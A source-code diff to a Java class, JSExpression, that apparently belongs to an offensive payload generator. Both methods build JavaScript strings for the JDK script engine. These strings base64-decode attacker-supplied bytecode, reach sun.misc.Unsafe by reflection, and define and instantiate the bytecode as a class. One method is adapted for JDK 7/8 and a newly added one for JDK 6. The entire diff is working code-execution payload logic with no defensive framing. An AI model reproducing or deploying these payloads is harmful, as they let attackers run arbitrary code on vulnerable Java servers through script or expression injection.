@@ -35,6 +35,11 @@ public class JSExpression{
         return jsExpression;
     }
 
+    /**
+     * 适配于jdk7和jdk8的js Engine引擎
+     * @param byteCode
+     * @return
+     */
     public static String unsafeExpressModify(byte[] byteCode){
         String jsExpression = "var s = '"+ Base64.getEncoder().encodeToString(byteCode) +"';" +
             "var bt;" +
@@ -45,8 +50,23 @@ public class JSExpression{
             "}" +
             "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
             "theUnsafeField.setAccessible(true);" +
-            "unsafe = theUnsafeField.get(null);" +
+            "var unsafe = theUnsafeField.get(null);" +
             "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
+        return jsExpression;
+    }
+
+    /**
+     * 适配于jdk6的js Engine引擎,jdk6的unsafe没有defineAnonymousClass只有defineClass方法
+     * @param byteCode
+     * @return
+     */
+    public static String unsafeExpressModifyByJdk6(byte[] byteCode){
+        String jsExpression = "var s = '"+ Base64.getEncoder().encodeToString(byteCode) +"';" +
+            "var theUnsafeMethod = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
+            "theUnsafeMethod.setAccessible(true);" +
+            "var unsafe = theUnsafeMethod.get(null);" +
+            "var classBytes = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
+            "unsafe.defineClass(null, classBytes, 0, classBytes.length, null, null).newInstance();";
         return jsExpression;
     }
 }
